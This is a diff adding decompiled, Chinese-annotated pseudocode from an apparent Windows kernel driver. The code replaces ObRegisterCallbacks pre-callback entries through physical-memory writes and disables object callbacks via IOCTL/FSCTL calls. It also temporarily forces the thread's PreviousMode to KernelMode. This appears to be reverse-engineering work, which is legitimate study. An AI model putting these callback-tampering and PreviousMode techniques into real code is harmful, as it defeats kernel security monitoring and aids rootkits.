@@ -3779,3 +3779,216 @@ __int64 OpenDeviceObjectForEnum(__int64 DeviceContext)
     return IsMatch;
 }
 
+// DisableObjectCallbackWithFallback — 禁用对象回调（带降级机制）(0x14000FC14)
+// 先尝试 DisableObjectCallback，失败则通过 DisableObjectCallbackViaDevice 使用文件系统 IOCTL 方式降级处理
+char __fastcall DisableObjectCallbackWithFallback(__int16 *DeviceId, _QWORD *Context)
+{
+    char result;
+
+    result = DisableObjectCallback(DeviceId, Context);
+    if (!result)
+        return DisableObjectCallbackViaDevice(DeviceId, Context);
+    return result;
+}
+
+// DisableObjectCallback — 禁用对象回调 (0x14000FC44)
+// 打开指定设备路径，发送 IOCTL 获取文件对象，验证设备对象指针是否匹配全局表中保存的设备对象，然后通过 CmdQueryFileEndOfFile 查询并返回结果
+__int64 DisableObjectCallback(__int16 *DevicePath, _QWORD *pResult)
+{
+    __int64 Result;
+    _QWORD *IoctlCode;
+    NTSTATUS (*DeviceIoControlFunc)(HANDLE, __int64, _QWORD, _QWORD, __int64 *, _QWORD);
+    __int64 CloseHandleFunc;
+    void (*CloseHandleFuncTyped)(__int64);
+    __int64 DeviceObjectPtr;
+    __int64 FileObject;
+    HANDLE Handle;
+    __int64 IoStatusBlock;
+
+    Result = 0;
+    IoctlCode = (_QWORD *)GtRead(GtZwCreateFileFunc);
+    DeviceIoControlFunc = (NTSTATUS (*)(HANDLE, __int64, _QWORD, _QWORD, __int64 *, _QWORD))GtRead(GtNtFsControlFileFunc);
+    CloseHandleFunc = GtRead(GtCloseHandleFunc);
+    CloseHandleFuncTyped = (void (*)(__int64))CloseHandleFunc;
+    if (IoctlCode && DeviceIoControlFunc && CloseHandleFunc
+        && !(unsigned int)CreateFileWithPath(DevicePath, 0, &Handle, 0x80, 0x80, 1, 1, 0x20))
+    {
+        if (DeviceIoControlFunc(Handle, 0x80000000, *IoctlCode, 0, &IoStatusBlock, 0) >= 0)
+        {
+            if (GetDeviceObjectFromFileObject(IoStatusBlock, &FileObject, 0))
+            {
+                DeviceObjectPtr = GtRead(GtSavedDeviceObject);
+                if (DeviceObjectPtr)
+                {
+                    if (*(_QWORD *)(FileObject + 8) == DeviceObjectPtr)
+                        Result = (unsigned int)CmdQueryFileEndOfFile(Handle, pResult) == 0;
+                }
+            }
+            CloseHandleFuncTyped(IoStatusBlock);
+        }
+        ZwClose(Handle);
+    }
+    return Result;
+}
+
+// DisableObjectCallbackViaDevice — 通过文件系统 IOCTL 禁用对象回调（降级方案）(0x14000FD8C)
+// 解析设备路径提取文件名，临时切换线程 PreviousMode=KernelMode，调用 FsIoControlRoutine 发送 FSCTL
+char __fastcall DisableObjectCallbackViaDevice(__int16 *DevicePath, _QWORD *pResult)
+{
+    char Success;
+    void (*StringAllocRoutine)(_BYTE *, __int16 *);
+    NTSTATUS (*FsIoControlRoutine)(HANDLE, _QWORD, _QWORD, _QWORD, _BYTE *, _QWORD *, unsigned int, int, char, _BYTE *, char);
+    unsigned int PrevModeOffset;
+    unsigned int PrevModeOffsetVal;
+    unsigned int StringLen;
+    unsigned int PathLen;
+    __int16 *PathBuf;
+    _QWORD *OutputBuf;
+    __int16 *LastSlash;
+    __int16 *FileNameStart;
+    __int16 SavedSeparator;
+    struct _KTHREAD *CurrentThread;
+    char SavedPrevMode;
+    int IoStatus;
+    _BYTE FileNameBuffer[16];
+    _BYTE IoStatusBlock[72];
+    unsigned int OutputSize;
+    HANDLE DeviceHandle;
+
+    Success = 0;
+    StringAllocRoutine = (void (*)(_BYTE *, __int16 *))GtRead(GtRtlInitUnicodeStringFunc);
+    FsIoControlRoutine = (NTSTATUS (*)(HANDLE, _QWORD, _QWORD, _QWORD, _BYTE *, _QWORD *, unsigned int, int, char, _BYTE *, char))GtRead(GtFsIoControlRoutine);
+    PrevModeOffset = GtRead(GtPrevModeOffset);
+    PrevModeOffsetVal = PrevModeOffset;
+    if (StringAllocRoutine)
+    {
+        if (FsIoControlRoutine)
+        {
+            if (PrevModeOffset != -1)
+            {
+                StringLen = GetStringLength(DevicePath);
+                PathLen = StringLen;
+                if (StringLen > 3)
+                {
+                    PathBuf = (__int16 *)ExAlloc(PagedPool, 2 * StringLen + 2);
+                    if (PathBuf)
+                    {
+                        OutputSize = 2 * PathLen + 112;
+                        OutputBuf = ExAlloc(PagedPool, OutputSize);
+                        if (OutputBuf)
+                        {
+                            WStringCopy(PathBuf, DevicePath);
+                            LastSlash = WStringFindLastChar(PathBuf, 92);
+                            if (LastSlash)
+                            {
+                                if (LastSlash == PathBuf + 2 && PathBuf[1] == 58)
+                                {
+                                    FileNameStart = LastSlash + 1;
+                                    SavedSeparator = *FileNameStart;
+                                    *FileNameStart = 0;
+                                }
+                                else
+                                {
+                                    *LastSlash = 0;
+                                    SavedSeparator = 0;
+                                    FileNameStart = LastSlash + 1;
+                                }
+                                if (!(unsigned int)CreateFileWithPath(PathBuf, 0, &DeviceHandle, 0x80, 0x80, 1, 1, 0x20))
+                                {
+                                    if (SavedSeparator)
+                                        *FileNameStart = SavedSeparator;
+                                    StringAllocRoutine(FileNameBuffer, FileNameStart);
+                                    CurrentThread = KeGetCurrentThread();
+                                    SavedPrevMode = *((_BYTE *)CurrentThread + PrevModeOffsetVal);
+                                    *((_BYTE *)CurrentThread + PrevModeOffsetVal) = 0;
+                                    IoStatus = FsIoControlRoutine(DeviceHandle, 0, 0, 0, IoStatusBlock,
+                                                                   OutputBuf, OutputSize, 37, 1, FileNameBuffer, 1);
+                                    *((_BYTE *)CurrentThread + PrevModeOffsetVal) = SavedPrevMode;
+                                    if (IoStatus >= 0)
+                                    {
+                                        Success = 1;
+                                        *pResult = OutputBuf[12];
+                                    }
+                                    ZwClose(DeviceHandle);
+                                }
+                            }
+                            ExFree(OutputBuf);
+                        }
+                        ExFree(PathBuf);
+                    }
+                }
+            }
+        }
+    }
+    return Success;
+}
+
+// InstallObjectPreCallbackHooks — 安装对象前置回调钩子 (0x14000FF88)
+// 读取全局表中三个 ObRegisterCallbacks 回调函数入口地址，保存原回调值，通过 WritePhysicalMemoryQword 替换为 ObjectPreCallback
+char InstallObjectPreCallbackHooks(void)
+{
+    __int64 *ObCallbackEntry1;
+    unsigned __int64 ObCallbackAddr1;
+    __int64 *ObCallbackEntry2;
+    unsigned __int64 ObCallbackAddr2;
+    __int64 *ObCallbackEntry3;
+    unsigned __int64 ObCallbackAddr3;
+
+    ObCallbackEntry1 = (__int64 *)GtRead(GtObCallbackEntry1 | 0x100);
+    ObCallbackAddr1 = (unsigned __int64)ObCallbackEntry1;
+    if (ObCallbackEntry1)
+    {
+        GtWrite(GtSavedObPreCallback1, *ObCallbackEntry1);
+        WritePhysicalMemoryQword(ObCallbackAddr1, (__int64)ObjectPreCallback);
+    }
+    ObCallbackEntry2 = (__int64 *)GtRead(GtObCallbackEntry2 | 0x100);
+    ObCallbackAddr2 = (unsigned __int64)ObCallbackEntry2;
+    if (ObCallbackEntry2)
+    {
+        GtWrite(GtSavedObPreCallback2, *ObCallbackEntry2);
+        WritePhysicalMemoryQword(ObCallbackAddr2, (__int64)ObjectPreCallback);
+    }
+    ObCallbackEntry3 = (__int64 *)GtRead(GtKernelDataField19);
+    ObCallbackAddr3 = (unsigned __int64)ObCallbackEntry3;
+    if (ObCallbackEntry3)
+    {
+        GtWrite(GtSavedObPreCallback3, *ObCallbackEntry3);
+        WritePhysicalMemoryQword(ObCallbackAddr3, (__int64)ObjectPreCallback);
+    }
+    return (char)ObCallbackEntry3;
+}
+
+// RestoreObjectPreCallbackHooks — 恢复对象前置回调钩子 (0x140010020)
+// 从全局表读取之前保存的原回调地址，通过 WritePhysicalMemoryQword 写回三个 ObRegisterCallbacks 回调入口
+char RestoreObjectPreCallbackHooks(void)
+{
+    unsigned __int64 ObCallbackAddr1;
+    __int64 SavedCallback1;
+    unsigned __int64 ObCallbackAddr2;
+    __int64 SavedCallback2;
+    __int64 ObCallbackAddr3Tmp;
+    unsigned __int64 ObCallbackAddr3;
+    __int64 SavedCallback3;
+
+    ObCallbackAddr1 = GtRead(GtObCallbackEntry1 | 0x100);
+    if (ObCallbackAddr1)
+    {
+        SavedCallback1 = GtRead(GtSavedObPreCallback1);
+        WritePhysicalMemoryQword(ObCallbackAddr1, SavedCallback1);
+    }
+    ObCallbackAddr2 = GtRead(GtObCallbackEntry2 | 0x100);
+    if (ObCallbackAddr2)
+    {
+        SavedCallback2 = GtRead(GtSavedObPreCallback2);
+        WritePhysicalMemoryQword(ObCallbackAddr2, SavedCallback2);
+    }
+    ObCallbackAddr3Tmp = GtRead(GtKernelDataField19);
+    ObCallbackAddr3 = ObCallbackAddr3Tmp;
+    if (ObCallbackAddr3Tmp)
+    {
+        SavedCallback3 = GtRead(GtSavedObPreCallback3);
+        WritePhysicalMemoryQword(ObCallbackAddr3, SavedCallback3);
+    }
+    return ObCallbackAddr3Tmp;
+}
+
